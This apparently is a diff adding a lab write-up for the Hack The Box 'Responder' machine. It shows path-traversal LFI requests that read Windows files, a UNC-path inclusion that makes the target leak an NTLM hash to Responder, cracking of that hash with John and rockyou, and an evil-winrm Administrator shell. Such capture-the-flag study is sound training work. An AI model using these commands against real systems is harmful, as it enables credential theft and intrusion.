@@ -1,0 +1,36 @@
+Responder Lab Report:
+
+Nmap Scan Report:
+
+80	Apache 2.4.52 + PHP 8.1.1 (Windows)	Main web application target
+5985	WinRM (Microsoft HTTPAPI)		Remote administration service on Windows
+  
+  
+Findings:
+  
+  Local File Inclusion (LFI) vulnerability found at page parameter when changing language in the webpage
+    GET /index.php?page=../../../../windows/system32/drivers/etc/hosts HTTP/1.1
+    GET /index.php?page=../../../../windows/system32/license.rtf HTTP/1.1
+    GET /index.php?page=../../../../windows/win.ini HTTP/1.1
+    Host: unika.htb
+  Can read arbitrary files on the Windows host
+    
+Exploit:
+
+  Using responder, captured the NTLM challenge hash by visiting /index.php?page=//10.10.17.9/somefile (Remote File Inclusion) though RIF nor worked it helped responder captures the challenge
+    >sudo responder -I tun0 -v
+    [responder ip] : 10.10.17.9
+    
+  Now the challenge hash is written on hash.txt
+    >echo "challenge_hash" > hash.txt
+  Using John The Ripper the hash is compared with the wordlist 
+    >john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+  
+  The password is found 'badminton' for username 'Administrator'
+  
+  Used evil-winrm to authenticate to the windows machine using the credentials found
+    >evil-winrm -i 10.129.54.63 -u Administrator -p 'badminton'
+    *Evil-WinRM* PS C:\Users\Administrator\Documents>whoami
+    responder/administrator
+    
+  Successfully got remoteshell access to the windows machine.
